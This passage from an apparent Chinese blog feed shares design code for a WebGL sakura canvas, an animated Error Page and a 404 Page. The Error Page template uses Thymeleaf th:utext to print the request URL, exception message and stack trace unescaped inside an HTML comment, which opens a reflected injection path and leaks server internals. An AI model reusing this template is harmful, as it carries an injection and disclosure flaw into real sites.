b.scrollHeight, d.scrollHeight, d.clientHeight);</span></span><br><span class="line"><span class="javascript">        canvas.width = fullw;</span></span><br><span class="line"><span class="javascript">        canvas.height = fullh;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">&quot;sakura&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">            makeCanvasFullScreen(canvas);</span></span><br><span class="line"><span class="javascript">            gl = canvas.getContext(<span class="string">&#x27;experimental-webgl&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;WebGL not supported.&quot;</span> + e);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.error(e);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;resize&#x27;</span>, onResize);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        setViewports();</span></span><br><span class="line"><span class="javascript">        createScene();</span></span><br><span class="line"><span class="javascript">        initScene();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        timeInfo.start = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        timeInfo.prev = timeInfo.start;</span></span><br><span class="line"><span class="javascript">        animate();</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//set window.requestAnimationFrame</span></span></span><br><span class="line"><span class="javascript">    (<span class="function"><span class="keyword">function</span> (<span class="params">w, r</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        w[<span class="string">&#x27;r&#x27;</span>+r] = w[<span class="string">&#x27;r&#x27;</span>+r] || w[<span class="string">&#x27;webkitR&#x27;</span>+r] || w[<span class="string">&#x27;mozR&#x27;</span>+r] || w[<span class="string">&#x27;msR&#x27;</span>+r] || w[<span class="string">&#x27;oR&#x27;</span>+r] || <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123; w.setTimeout(c, <span class="number">1000</span> / <span class="number">60</span>); &#125;;</span></span><br><span class="line"><span class="javascript">    &#125;)(<span class="built_in">window</span>, <span class="string">&#x27;requestAnimationFrame&#x27;</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Page </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Error Page 设计演示01</title>
      <link href="/2021/10/31/design_ErrorPage_2021_10_31/"/>
      <url>/2021/10/31/design_ErrorPage_2021_10_31/</url>
      
        <content type="html"><![CDATA[<p><strong>分享大家一个好看的 Error Page 代码</strong></p><hr><h3 id="演示图"><a href="#演示图" class="headerlink" title="演示图"></a>演示图</h3><p><img src="https://z3.ax1x.com/2021/10/31/5z70Rx.png"></p><h3 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    Developer: @Arvin</span></span><br><span class="line"><span class="comment">    Explain: Error Page</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Error Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 导入字体 @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="keyword">@import</span> url(<span class="string">&quot;https://fonts.googleapis.com/css2?family=Bowlby+One+SC&amp;display=swap&quot;</span>);</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-pseudo">:root</span> &#123;</span></span><br><span class="line"><span class="css">            --<span class="attribute">background-color</span>: <span class="number">#000</span>;</span></span><br><span class="line"><span class="css">            --<span class="attribute">border-color</span>    : <span class="number">#7591AD</span>;</span></span><br><span class="line"><span class="css">            --text-<span class="attribute">color</span>      : <span class="number">#34495e</span>;</span></span><br><span class="line"><span class="css">            --color1          : <span class="number">#EC3E27</span>;</span></span><br><span class="line"><span class="css">            --color2          : <span class="number">#f01d67</span>;</span></span><br><span class="line"><span class="css">            --color3          : <span class="number">#1474bd</span>;</span></span><br><span class="line"><span class="css">            --color4          : <span class="number">#04ffcd</span>;</span></span><br><span class="line"><span class="css">            --color5          : <span class="number">#fdcb6e</span>;</span></span><br><span class="line"><span class="css">            --color6          : <span class="number">#e056fd</span>;</span></span><br><span class="line"><span class="css">            --color7          : <span class="number">#F97F51</span>;</span></span><br><span class="line"><span class="css">            --color8          : <span class="number">#BDC581</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        * &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span> : <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>           : <span class="number">100vw</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>          : <span class="number">100vh</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="built_in">var</span>(--background-color);</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>         : flex;</span></span><br><span class="line"><span class="css">            <span class="attribute">justify-content</span> : center;</span></span><br><span class="line"><span class="css">            <span class="attribute">align-items</span>     : center;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-family</span>     : <span class="string">&#x27;Montserrat&#x27;</span>, sans-serif, Arial, <span class="string">&#x27;Microsoft Yahei&#x27;</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.channel</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>   : absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>      : <span class="number">80%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span> : center;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>        : <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>       : <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>  : <span class="built_in">translate</span>(-<span class="number">45%</span>, -<span class="number">200px</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>  : <span class="number">30px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>      : <span class="number">#fff</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>              : <span class="number">350px</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/* background-color: #fff; */</span></span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>        : flex;</span></span><br><span class="line"><span class="css">            <span class="attribute">justify-content</span>: space-around;</span></span><br><span class="line"><span class="css">            <span class="attribute">align-items</span>    : center;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">            <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box</span> <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>        : relative;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>       : <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-family</span>     : <span class="string">&#x27;Bowlby One SC&#x27;</span>, Arial, Helvetica, sans-serif;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>           : <span class="number">#FFF</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>       : <span class="built_in">scale</span>(<span class="number">0.9</span>, <span class="number">1</span>) <span class="built_in">rotateY</span>(-<span class="number">45deg</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">transform-origin</span>: bottom center;</span></span><br><span class="line"><span class="css">            <span class="attribute">animation</span>       : animate <span class="number">2.5s</span> ease-in-out infinite;</span></span><br><span class="line"><span class="css">            <span class="attribute">animation-delay</span>: <span class="built_in">calc</span>(<span class="built_in">var</span>(--i) * <span class="number">100ms</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="keyword">@keyframes</span> animate &#123;</span></span><br><span class="line"><span class="css">            <span class="number">20%</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>, <span class="number">1</span>) <span class="built_in">rotateY</span>(-<span class="number">45deg</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">text-shadow</span>:</span></span><br><span class="line"><span class="css">                        <span class="number">0</span> <span class="number">0</span> <span class="built_in">var</span>(--color2),</span></span><br><span class="line"><span class="css">                        <span class="number">0</span> <span class="number">0</span> <span class="built_in">var</span>(--color3),</span></span><br><span class="line"><span class="css">                        <span class="number">0</span> <span class="number">0</span> <span class="built_in">var</span>(--color4);</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">            <span class="number">40%</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>, <span class="number">2</span>) <span class="built_in">translateY</span>(<span class="number">16px</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">text-shadow</span>:</span></span><br><span class="line"><span class="css">                        -<span class="number">10px</span> -<span class="number">2px</span> <span class="built_in">var</span>(--color2),</span></span><br><span class="line"><span class="css">                        -<span class="number">20px</span> -<span class="number">3px</span> <span class="built_in">var</span>(--color3),</span></span><br><span class="line"><span class="css">                        -<span class="number">30px</span> -<span class="number">4px</span> <span class="built_in">var</span>(--color4);</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">            <span class="number">60%</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>, <span class="number">1</span>) <span class="built_in">rotateY</span>(<span class="number">45deg</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">text-shadow</span>:</span></span><br><span class="line"><span class="css">                        <span class="number">0</span> <span class="number">0</span> <span class="built_in">var</span>(--color2),</span></span><br><span class="line"><span class="css">                        <span class="number">0</span> <span class="number">0</span> <span class="built_in">var</span>(--color3),</span></span><br><span class="line"><span class="css">                        <span class="number">0</span> <span class="number">0</span> <span class="built_in">var</span>(--color4);</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">            <span class="number">80%</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>, <span class="number">2</span>) <span class="built_in">translateY</span>(<span class="number">16px</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">text-shadow</span>:</span></span><br><span class="line"><span class="css">                        <span class="number">10px</span> -<span class="number">2px</span> <span class="built_in">var</span>(--color2),</span></span><br><span class="line"><span class="css">                        <span class="number">20px</span> -<span class="number">3px</span> <span class="built_in">var</span>(--color3),</span></span><br><span class="line"><span class="css">                        <span class="number">30px</span> -<span class="number">4px</span> <span class="built_in">var</span>(--color4);</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error Page<span class="tag">&lt;/<span class="name">H1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;channel&quot;</span>&gt;</span></span><br><span class="line">    TCT 呼叫程序猿大大 ＞﹏＜</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;--i:1&quot;</span>&gt;</span>E<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;--i:2&quot;</span>&gt;</span>R<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;--i:3&quot;</span>&gt;</span>R<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;--i:4&quot;</span>&gt;</span>O<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;--i:5&quot;</span>&gt;</span>R<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:Utext</span>=<span class="string">&quot;&#x27;<span class="symbol">&amp;lt;</span>!--&#x27;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;&#x27;Failed Request URL : &#x27; + $&#123;url&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;&#x27;Expiration message : &#x27; + $&#123;exception.message&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">th:each</span>=<span class="string">&quot;st : $&#123;exception.stackTrace&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:utext</span>=<span class="string">&quot;$&#123;st&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;&#x27;--<span class="symbol">&amp;gt;</span>&#x27;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Page </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>404 Page 设计演示01</title>
      <link href="/2021/10/31/design_404Page_2021_10_31/"/>
      <url>/2021/10/31/design_404Page_2021_10_31/</url>
      
        <content type="html"><![CDATA[<p><strong>分享大家一个好看的 404 Page 代码</strong></p><hr><h3 id="演示图"><a href="#演示图" class="headerlink" title="演示图"></a>演示图</h3><p><img src="https://z3.ax1x.com/2021/10/31/5zTL26.png"></p><hr><h3 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    Developer: @Arvin</span></span><br><span class="line"><span class="comment">    Explain: 404 Page</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>休息一下吧&lt;( ￣^￣)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-pseudo">:root</span> &#123;</span></span><br><span class="line"><span class="css">            --<span class="attribute">background-color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="css">            --<span class="attribute">border-color</span>: <span class="number">#7591AD</span>;</span></span><br><span class="line"><span class="css">            --text-<span class="attribute">color</span>: <span class="number">#34495e</span>;</span></span><br><span class="line"><span class="css">            --color1: <span class="number">#EC3E27</span>;</span></span><br><span class="line"><span class="css">            --color2: <span class="number">#FD79A8</span>;</span></span><br><span class="line"><span class="css">            --color3: <span class="number">#0984E3</span>;</span></span><br><span class="line"><span class="css">            --color4: <span class="number">#00B894</span>;</span></span><br><span class="line"><span class="css">            --color5: <span class="number">#FDCB6E</span>;</span></span><br><span class="line"><span class="css">            --color6: <span class="number">#E056FD</span>;</span></span><br><span class="line"><span class="css">            --color7: <span class="number">#F97F51</span>;</span></span><br><span class="line"><span class="css">            --color8: <span class="number">#BDC581</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        * &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">html</span> &#123;<span class="attribute">font-size</span>: <span class="number">14px</span>;&#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100vw</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="built_in">var</span>(--background-color);</span></span><br><span class="line"><span class="css">            <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to right bottom, <span class="built_in">var</span>(--color_left), <span class="built_in">var</span>(--color_leftcolor_right));</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Montserrat&#x27;</span>, sans-serif, Arial, <span class="string">&#x27;Microsoft Yahei&#x27;</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.channel</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">200px</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="css">            <span class="attribute">justify-content</span>: space-between;</span></span><br><span class="line"><span class="css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>: <span class="number">240px</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/*background-color: #ff5f99;*/</span></span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-weight</span>: <span class="number">800</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-family</span>: arial, helvetica, sans-serif;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span> <span class="selector-tag">span</span><span class="selector-class">.middle</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/*background-color: #d0ffc6;*/</span></span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span> <span class="selector-tag">span</span><span class="selector-class">.middle</span><span class="selector-pseudo">::before</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span> <span class="selector-tag">span</span><span class="selector-class">.middle</span><span class="selector-pseudo">::after</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/*background-color: #ffbd98;*/</span></span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">            <span class="comment">/* 效果实现: 内阴影 透明度66(十六进制) &lt;左上右下&gt; @Arvin */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">box-shadow</span>:</span></span><br><span class="line"><span class="css">            inset <span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#FD79A8</span>66,</span></span><br><span class="line"><span class="css">            inset <span class="number">0</span> <span class="number">30px</span> <span class="number">0</span> <span class="number">#0984E3</span>66,</span></span><br><span class="line"><span class="css">            inset -<span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#EC3E27</span>66,</span></span><br><span class="line"><span class="css">            inset <span class="number">0</span> -<span class="number">30px</span> <span class="number">0</span> <span class="number">#D0FFc6</span>66;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">animation</span>: animate_before <span class="number">5s</span> linear infinite;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span> <span class="selector-tag">span</span><span class="selector-class">.middle</span><span class="selector-pseudo">::after</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">45deg</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 动画效果: 分成四次顺时针切换四个阴影颜色 @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="keyword">@keyframes</span> animate_before&#123;</span></span><br><span class="line"><span class="css">            <span class="number">0%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">box-shadow</span>:</span></span><br><span class="line"><span class="css">                        inset <span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#FD79A8</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> <span class="number">30px</span> <span class="number">0</span> <span class="number">#0984E3</span>66,</span></span><br><span class="line"><span class="css">                        inset -<span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#EC3E27</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> -<span class="number">30px</span> <span class="number">0</span> <span class="number">#D0FFc6</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">25%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">box-shadow</span>:</span></span><br><span class="line"><span class="css">                        inset <span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#0984E3</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> <span class="number">30px</span> <span class="number">0</span> <span class="number">#EC3E27</span>66,</span></span><br><span class="line"><span class="css">                        inset -<span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#D0FFc6</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> -<span class="number">30px</span> 